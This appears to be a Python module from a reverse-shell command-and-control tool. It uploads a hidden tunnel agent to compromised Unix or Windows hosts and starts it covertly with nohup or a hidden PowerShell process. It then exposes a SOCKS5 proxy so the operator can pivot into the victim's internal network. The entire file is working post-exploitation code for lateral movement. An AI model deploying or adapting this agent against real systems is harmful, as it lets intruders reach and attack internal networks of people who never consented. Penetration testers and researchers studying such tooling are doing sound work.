"""SOCKS5 internal pivoting through reverse shell sessions."""

import base64
import json
import os
import select
import socket
import struct
import threading
import time

from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START
from .sysinfo import _b64_exec_cmd

# Embedded remote tunnel agent (Python 3). Listens on 127.0.0.1, multiplexes TCP streams.
_REMOTE_AGENT_SOURCE = r'''
import base64, json, select, socket, struct, sys, threading

def recv_msg(conn):
    hdr = b''
    while len(hdr) < 4:
        chunk = conn.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack('>I', hdr)[0]
    if length > 16 * 1024 * 1024:
        return None
    data = b''
    while len(data) < length:
        chunk = conn.recv(min(65536, length - len(data)))
        if not chunk:
            return None
        data += chunk
    return json.loads(data.decode('utf-8'))

def send_msg(conn, obj):
    payload = json.dumps(obj, separators=(',', ':')).encode('utf-8')
    conn.sendall(struct.pack('>I', len(payload)) + payload)

def main():
    token = sys.argv[1] if len(sys.argv) > 1 else 'default'
    import os
    if os.name == 'nt':
        base = os.environ.get('TEMP') or os.environ.get('TMP') or 'C:/Windows/Temp'
    else:
        base = '/tmp'
    port_path = os.path.join(base, f'.tornado_tun_{token}.port')
    sock_path = os.path.join(base, f'.tornado_tun_{token}.sock')
    try:
        if os.path.exists(sock_path):
            os.unlink(sock_path)
    except Exception:
        pass
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', 0))
    srv.listen(64)
    port = srv.getsockname()[1]
    try:
        with open(port_path, 'w') as fh:
            fh.write(str(port))
    except Exception:
        pass
    streams = {}
    lock = threading.Lock()

    def close_stream(sid):
        with lock:
            entry = streams.pop(sid, None)
        if entry:
            try:
                entry['sock'].close()
            except Exception:
                pass

    def handle_client(conn):
        try:
            while True:
                msg = recv_msg(conn)
                if not msg:
                    break
                op = msg.get('op')
                sid = msg.get('sid')
                if op == 'ping':
                    send_msg(conn, {'ok': True, 'op': 'pong'})
                elif op == 'connect':
                    host = msg.get('host', '127.0.0.1')
                    port = int(msg.get('port', 0))
                    try:
                        remote = socket.create_connection((host, port), timeout=15)
                        remote.setblocking(False)
                        with lock:
                            streams[sid] = {'sock': remote, 'buf': b'', 'closed': False}
                        send_msg(conn, {'ok': True, 'sid': sid})
                    except Exception as exc:
                        send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
                elif op == 'send':
                    data = base64.b64decode(msg.get('data', '') or '')
                    with lock:
                        entry = streams.get(sid)
                    if not entry or entry['closed']:
                        send_msg(conn, {'ok': False, 'sid': sid, 'error': 'closed'})
                        continue
                    try:
                        entry['sock'].sendall(data)
                        send_msg(conn, {'ok': True, 'sid': sid})
                    except Exception as exc:
                        entry['closed'] = True
                        send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
                elif op == 'recv':
                    max_bytes = int(msg.get('max', 65536))
                    with lock:
                        entry = streams.get(sid)
                    if not entry:
                        send_msg(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
                        continue
                    chunk = b''
                    closed = entry['closed']
                    if entry['buf']:
                        chunk = entry['buf'][:max_bytes]
                        entry['buf'] = entry['buf'][len(chunk):]
                    else:
                        try:
                            r, _, _ = select.select([entry['sock']], [], [], 0)
                            if r:
                                piece = entry['sock'].recv(max_bytes)
                                if not piece:
                                    entry['closed'] = True
                                    closed = True
                                else:
                                    chunk = piece
                        except Exception:
                            entry['closed'] = True
                            closed = True
                    send_msg(conn, {
                        'ok': True, 'sid': sid,
                        'data': base64.b64encode(chunk).decode('ascii'),
                        'closed': closed,
                    })
                elif op == 'close':
                    close_stream(sid)
                    send_msg(conn, {'ok': True, 'sid': sid})
                elif op == 'batch':
                    results = []
                    for item in msg.get('items', []):
                        sub = dict(item)
                        sub_op = sub.pop('op', '')
                        if sub_op == 'send':
                            sid = sub.get('sid')
                            data = base64.b64decode(sub.get('data', '') or '')
                            with lock:
                                entry = streams.get(sid)
                            if not entry or entry['closed']:
                                results.append({'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
                                continue
                            try:
                                entry['sock'].sendall(data)
                                results.append({'ok': True, 'sid': sid})
                            except Exception as exc:
                                entry['closed'] = True
                                results.append({'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
                        elif sub_op == 'recv':
                            sid = sub.get('sid')
                            max_bytes = int(sub.get('max', 65536))
                            with lock:
                                entry = streams.get(sid)
                            if not entry:
                                results.append({'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
                                continue
                            chunk = b''
                            closed = entry['closed']
                            if entry['buf']:
                                chunk = entry['buf'][:max_bytes]
                                entry['buf'] = entry['buf'][len(chunk):]
                            else:
                                try:
                                    r, _, _ = select.select([entry['sock']], [], [], 0)
                                    if r:
                                        piece = entry['sock'].recv(max_bytes)
                                        if not piece:
                                            entry['closed'] = True
                                            closed = True
                                        else:
                                            chunk = piece
                                except Exception:
                                    entry['closed'] = True
                                    closed = True
                            results.append({
                                'ok': True, 'sid': sid,
                                'data': base64.b64encode(chunk).decode('ascii'),
                                'closed': closed,
                            })
                    send_msg(conn, {'ok': True, 'results': results})
                else:
                    send_msg(conn, {'ok': False, 'error': 'unknown op'})
        finally:
            try:
                conn.close()
            except Exception:
                pass

    while True:
        try:
            conn, _ = srv.accept()
            conn.settimeout(300)
            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
        except Exception:
            break

if __name__ == '__main__':
    main()
'''


class TunnelManager:
    """Manage SOCKS5 proxies for internal network pivoting through reverse shell sessions."""

    def __init__(self, handler):
        self.h = handler
        self._lock = threading.Lock()
        self._counter = 0
        self._proxies = {}    # proxy_id -> proxy dict
        self._session_agents = {}  # client_sock -> agent info
        self._session_locks = {}   # client_sock -> threading.Lock
        self._last_error = ''

    def _next_id(self, prefix):
        with self._lock:
            self._counter += 1
            return f"{prefix}{self._counter}"

    def _session_lock(self, client_sock):
        with self._lock:
            if client_sock not in self._session_locks:
                self._session_locks[client_sock] = threading.Lock()
            return self._session_locks[client_sock]

    def _log(self, client_sock, message):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_tunnel(message)

    def _agent_token(self, client_sock):
        info = self.h._client_info(client_sock)
        if not info:
            return None
        return f"s{info['id']}"

    def _set_error(self, message):
        self._last_error = message

    def _tunnel_marked(self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0, strip_ws=True):
        return self.h._run_marked(
            client_sock, unix_cmd, win_ps_script, shell_type, timeout=timeout,
            start_mark=TUNNEL_MARK_START, end_mark=TUNNEL_MARK_END, strip_ws=strip_ws,
        )

    def _remote_paths(self, client_sock, shell_type, token):
        staging_name = f".tornado_agent_{token}.py"
        if shell_type == 'windows':
            agent_path = self.h.payload_exec._resolve_staging_path(client_sock, shell_type, staging_name)
        else:
            agent_path = f"/tmp/.tornado_agent_{token}.py"
        port_path = os.path.join(
            os.path.dirname(agent_path.replace('/', os.sep)),
            f".tornado_tun_{token}.port",
        )
        return agent_path, port_path

    def _upload_agent(self, client_sock, agent_path, shell_type):
        data = _REMOTE_AGENT_SOURCE.encode('utf-8')
        chunk_size = 8192
        for offset in range(0, len(data), chunk_size):
            chunk = data[offset:offset + chunk_size]
            if not self.h._remote_write_chunk(
                client_sock, agent_path, chunk, shell_type, truncate=(offset == 0),
            ):
                self._set_error('failed to upload tunnel agent to remote host')
                return False
        return True

    def _deploy_agent(self, client_sock):
        if client_sock in self._session_agents and self._session_agents[client_sock].get('ready'):
            return self._session_agents[client_sock]

        info = self.h._client_info(client_sock)
        if not info:
            self._set_error('session not active')
            return None

        shell_type = info.get('type', 'unix')
        token = self._agent_token(client_sock)
        agent_path, port_path = self._remote_paths(client_sock, shell_type, token)
        path_esc = self.h._escape_path(agent_path, shell_type)
        port_esc = self.h._escape_path(port_path, shell_type)
        token_esc = token.replace("'", "'\\''")

        if not self._upload_agent(client_sock, agent_path, shell_type):
            return None

        if shell_type == 'windows':
            deploy_ps = (
                f"$p='{path_esc}';$portFile='{port_esc}';"
                f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
                f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
                f"if(-not $py){{'{TUNNEL_MARK_START}NO_PYTHON{TUNNEL_MARK_END}';return}};"
                f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
                f"Start-Process -FilePath $py -ArgumentList @($p,'{token}') -WindowStyle Hidden | Out-Null;"
                f"1..24 | ForEach-Object {{"
                f"  if(Test-Path -LiteralPath $portFile){{"
                f"    '{TUNNEL_MARK_START}'+(Get-Content -LiteralPath $portFile -Raw).Trim()+'{TUNNEL_MARK_END}';return"
                f"  }}; Start-Sleep -Milliseconds 250"
                f"}};"
                f"'{TUNNEL_MARK_START}ERR{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, '', deploy_ps, 'windows', timeout=25.0)
        else:
            unix_cmd = (
                f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                f"if [ -z \"$PY\" ]; then printf '%sNO_PYTHON%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'; exit 0; fi; "
                f"nohup \"$PY\" '{path_esc}' '{token_esc}' >/dev/null 2>&1 & "
                f"i=0; while [ $i -lt 24 ]; do "
                f"if [ -f '{port_esc}' ]; then "
                f"printf '%s' '{TUNNEL_MARK_START}'; cat '{port_esc}' 2>/dev/null | tr -d '\\n'; "
                f"printf '%s' '{TUNNEL_MARK_END}'; exit 0; fi; "
                f"sleep 0.25; i=$((i+1)); done; "
                f"printf '%sERR%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=25.0)

        if payload == 'NO_PYTHON':
            self._set_error('Python is not installed on the remote host (required for tunneling)')
            return None
        if not payload or payload == 'ERR':
            self._set_error('tunnel agent failed to start on remote host (check Python and /tmp or /dev/shm)')
            return None
        try:
            port = int(payload)
        except ValueError:
            self._set_error(f'invalid tunnel agent port response: {payload!r}')
            return None

        agent = {
            'token': token,
            'port': port,
            'ready': True,
            'remote_path': agent_path,
            'port_path': port_path,
        }
        self._session_agents[client_sock] = agent
        self._last_error = ''
        self._log(client_sock, f"Tunnel agent deployed on remote 127.0.0.1:{port}")
        return agent

    def _send_agent_message(self, client_sock, agent, message, timeout=15.0):
        info = self.h._client_info(client_sock)
        shell_type = info.get('type', 'unix') if info else 'unix'
        port = agent['port']
        msg_json = json.dumps(message, separators=(',', ':'))
        msg_b64 = base64.b64encode(msg_json.encode('utf-8')).decode('ascii')

        if shell_type == 'windows':
            ps = (
                f"$port={port};"
                f"$msg=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{msg_b64}'));"
                f"$client=New-Object Net.Sockets.TcpClient('127.0.0.1',$port);"
                f"$stream=$client.GetStream();"
                f"$bytes=[Text.Encoding]::UTF8.GetBytes($msg);"
                f"$len=[BitConverter]::GetBytes([uint32]$bytes.Length);"
                f"if([BitConverter]::IsLittleEndian){{[Array]::Reverse($len)}};"
                f"$stream.Write($len,0,4);$stream.Write($bytes,0,$bytes.Length);"
                f"$hdr=New-Object byte[] 4;$stream.Read($hdr,0,4)|Out-Null;"
                f"[Array]::Reverse($hdr);$rLen=[BitConverter]::ToUInt32($hdr,0);"
                f"$resp=New-Object byte[] $rLen;$read=0;"
                f"while($read -lt $rLen){{$n=$stream.Read($resp,$read,$rLen-$read);if($n-le 0){{break}};$read+=$n}};"
                f"$stream.Close();$client.Close();"
                f"'{TUNNEL_MARK_START}'+[Text.Encoding]::UTF8.GetString($resp)+'{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, '', ps, 'windows', timeout=timeout, strip_ws=False)
        else:
            client_source = (
                "import base64,json,socket,struct\n"
                f"msg=json.loads(base64.b64decode('{msg_b64}').decode())\n"
                f"s=socket.create_connection(('127.0.0.1',{port}),timeout=10)\n"
                "payload=json.dumps(msg,separators=(',',':')).encode()\n"
                "s.sendall(struct.pack('>I',len(payload))+payload)\n"
                "hdr=s.recv(4)\n"
                "rl=struct.unpack('>I',hdr)[0] if len(hdr)==4 else 0\n"
                "data=b''\n"
                "while len(data)<rl:\n"
                " chunk=s.recv(min(65536,rl-len(data)))\n"
                " if not chunk: break\n"
                " data+=chunk\n"
                "s.close()\n"
                f"print('{TUNNEL_MARK_START}'+data.decode()+ '{TUNNEL_MARK_END}', end='')"
            )
            unix_cmd = _b64_exec_cmd(client_source, (
                ('python3', 'python'),
                ('python', 'python'),
            ))
            payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=timeout, strip_ws=False)

        if not payload:
            return None
        try:
            return json.loads(payload)
        except json.JSONDecodeError:
            self._set_error('tunnel agent returned invalid JSON')
            return None

    def _agent_request(self, client_sock, message, timeout=15.0):
        agent = self._deploy_agent(client_sock)
        if not agent:
            return None
        resp = self._send_agent_message(client_sock, agent, message, timeout=timeout)
        if message.get('op') == 'ping' and (not resp or not resp.get('ok')):
            self._session_agents.pop(client_sock, None)
            agent = self._deploy_agent(client_sock)
            if agent:
                resp = self._send_agent_message(client_sock, agent, message, timeout=timeout)
        return resp

    def _agent_batch(self, client_sock, items, timeout=15.0):
        return self._agent_request(client_sock, {'op': 'batch', 'items': items}, timeout=timeout)

    def cleanup_session(self, client_sock):
        """Stop SOCKS proxies and remove agent state for a session."""
        to_stop = []
        with self._lock:
            for pid, proxy in list(self._proxies.items()):
                if proxy.get('client_sock') == client_sock:
                    to_stop.append(pid)
        for proxy_id in to_stop:
            self._stop_proxy(proxy_id, reason='session disconnected')
        with self._lock:
            self._session_agents.pop(client_sock, None)
            self._session_locks.pop(client_sock, None)

    def start_socks(self, client_sock, listen_port):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return False

        try:
            listen_port = int(listen_port)
        except ValueError:
            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
            return False

        ping = self._agent_request(client_sock, {'op': 'ping'}, timeout=25.0)
        if not ping or not ping.get('ok'):
            detail = self._last_error or 'tunnel agent did not respond'
            print(
                f"{self.h.colors['red']}Failed to deploy tunnel agent on remote session: {detail}{self.h.colors['end']}"
            )
            return False

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind(('127.0.0.1', listen_port))
            listener.listen(128)
        except OSError as exc:
            listener.close()
            print(f"{self.h.colors['red']}Cannot bind 127.0.0.1:{listen_port}: {exc}{self.h.colors['end']}")
            return False

        proxy_id = self._next_id('socks')
        stop_event = threading.Event()
        proxy = {
            'id': proxy_id,
            'type': 'socks5',
            'client_sock': client_sock,
            'session_id': info['id'],
            'listen_port': listen_port,
            'listener': listener,
            'stop_event': stop_event,
            'stream_counter': 0,
        }
        with self._lock:
            self._proxies[proxy_id] = proxy

        def accept_loop():
            while not stop_event.is_set():
                try:
                    listener.settimeout(1.0)
                    try:
                        conn, addr = listener.accept()
                    except socket.timeout:
                        continue
                    threading.Thread(
                        target=self._handle_socks_client,
                        args=(proxy_id, client_sock, conn, addr),
                        daemon=True,
                    ).start()
                except OSError:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()

        msg = f"SOCKS5 proxy {proxy_id}: 127.0.0.1:{listen_port} via session #{info['id']}"
        print(f"{self.h.colors['green']}{msg}{self.h.colors['end']}")
        print(f"{self.h.colors['cyan']}  Use proxychains/nproxy: socks5 127.0.0.1 {listen_port}{self.h.colors['end']}")
        self._log(client_sock, f"Created {msg}")
        return True

    def _recv_exact(self, sock, n, timeout=10.0):
        data = b''
        end = time.time() + timeout
        while len(data) < n and time.time() < end:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                continue
            except OSError:
                return None
        return data if len(data) == n else None

    def _handle_socks_client(self, proxy_id, client_sock, conn, addr):
        sid = None
        try:
            conn.settimeout(10.0)
            greeting = self._recv_exact(conn, 2)
            if not greeting or greeting[0] != 0x05:
                return
            nmethods = greeting[1]
            methods = self._recv_exact(conn, nmethods)
            if not methods:
                return
            conn.sendall(b'\x05\x00')

            req = self._recv_exact(conn, 4)
            if not req or req[0] != 0x05 or req[1] != 0x01:
                return
            atyp = req[3]
            if atyp == 0x01:
                addr_bytes = self._recv_exact(conn, 4)
                host = socket.inet_ntoa(addr_bytes) if addr_bytes else None
            elif atyp == 0x03:
                ln = self._recv_exact(conn, 1)
                if not ln:
                    return
                host_bytes = self._recv_exact(conn, ln[0])
                host = host_bytes.decode('utf-8', errors='ignore') if host_bytes else None
            elif atyp == 0x04:
                addr_bytes = self._recv_exact(conn, 16)
                host = socket.inet_ntop(socket.AF_INET6, addr_bytes) if addr_bytes else None
            else:
                conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                return
            port_bytes = self._recv_exact(conn, 2)
            if not port_bytes or not host:
                return
            port = struct.unpack('!H', port_bytes)[0]

            with self._lock:
                proxy = self._proxies.get(proxy_id)
                if not proxy:
                    return
                proxy['stream_counter'] += 1
                sid = proxy['stream_counter']

            lock = self._session_lock(client_sock)
            with lock:
                resp = self._agent_request(
                    client_sock,
                    {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
                    timeout=25.0,
                )
            if not resp or not resp.get('ok'):
                conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                return

            bind_addr = socket.inet_aton('0.0.0.0')
            reply = b'\x05\x00\x00\x01' + bind_addr + struct.pack('!H', 0)
            conn.sendall(reply)
            conn.setblocking(False)

            closed = False
            while not closed:
                if client_sock not in self.h.revshell_clients:
                    break
                batch = []
                try:
                    r, _, _ = select.select([conn], [], [], 0.05)
                    if r:
                        data = conn.recv(65536)
                        if not data:
                            closed = True
                        else:
                            batch.append({
                                'op': 'send', 'sid': sid,
                                'data': base64.b64encode(data).decode('ascii'),
                            })
                except OSError:
                    closed = True

                batch.append({'op': 'recv', 'sid': sid, 'max': 65536})

                with lock:
                    if len(batch) == 1:
                        res = self._agent_request(client_sock, batch[0], timeout=15.0)
                        results = [res] if res else []
                    else:
                        res = self._agent_batch(client_sock, batch, timeout=15.0)
                        results = res.get('results', []) if res and res.get('ok') else []

                recv_res = results[-1] if results else None
                if recv_res and recv_res.get('data'):
                    try:
                        conn.sendall(base64.b64decode(recv_res['data']))
                    except OSError:
                        closed = True
                if recv_res and recv_res.get('closed'):
                    closed = True

                if not batch or (len(batch) == 1 and batch[0]['op'] == 'recv'):
                    time.sleep(0.02)

            with lock:
                self._agent_request(client_sock, {'op': 'close', 'sid': sid}, timeout=5.0)
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def _stop_proxy(self, proxy_id, reason='operator request'):
        with self._lock:
            proxy = self._proxies.pop(proxy_id, None)
        if not proxy:
            return False
        proxy['stop_event'].set()
        try:
            proxy['listener'].close()
        except OSError:
            pass
        client_sock = proxy.get('client_sock')
        msg = f"SOCKS5 proxy {proxy_id} stopped ({reason})"
        print(f"{self.h.colors['yellow']}{msg}{self.h.colors['end']}")
        if client_sock:
            self._log(client_sock, msg)
        return True

    def list_tunnels(self):
        with self._lock:
            proxies = list(self._proxies.values())
        if not proxies:
            print(f"{self.h.colors['yellow']}No active SOCKS proxies{self.h.colors['end']}")
            return
        print(f"{self.h.colors['green']}SOCKS5 proxies:{self.h.colors['end']}")
        for proxy in proxies:
            alive = proxy['client_sock'] in self.h.revshell_clients
            status = 'active' if alive else 'orphaned'
            print(
                f"  {proxy['id']} session #{proxy['session_id']} "
                f"127.0.0.1:{proxy['listen_port']} [{status}]"
            )

    def handle_command(self, client_sock, cmd_parts, from_client=False):
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2] if len(cmd_parts) > 2 else ''):
                return True
            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
            return True

        if cmd == 'socks':
            if from_client:
                if len(cmd_parts) < 2:
                    print(f"{self.h.colors['red']}Usage: socks <listen_port>{self.h.colors['end']}")
                    return True
                self.start_socks(client_sock, cmd_parts[1])
                return True
            if len(cmd_parts) < 3:
                print(f"{self.h.colors['red']}Usage: socks <session_id> <listen_port>{self.h.colors['end']}")
                return True
            self.start_socks(client_sock, cmd_parts[2])
            return True

        if cmd == 'tunnels':
            self.list_tunnels()
            return True

        return False

    def handle_main_command(self, cmd_parts):
        """Handle main-menu SOCKS commands that include session ID resolution."""
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()

        if cmd == 'tunnels':
            self.list_tunnels()
            return True

        if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2]):
                return True
            print(f"{self.h.colors['red']}Proxy {cmd_parts[2]} not found{self.h.colors['end']}")
            return True

        if cmd == 'socks':
            if len(cmd_parts) < 3:
                print(f"{self.h.colors['red']}Usage: socks <session_id> <listen_port>{self.h.colors['end']}")
                return True
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            client_sock = self.h._get_client_by_id(session_id)
            if not client_sock:
                print(f"{self.h.colors['red']}Client #{session_id} not active{self.h.colors['end']}")
                return True
            self.handle_command(client_sock, cmd_parts, from_client=False)
            return True

        return False
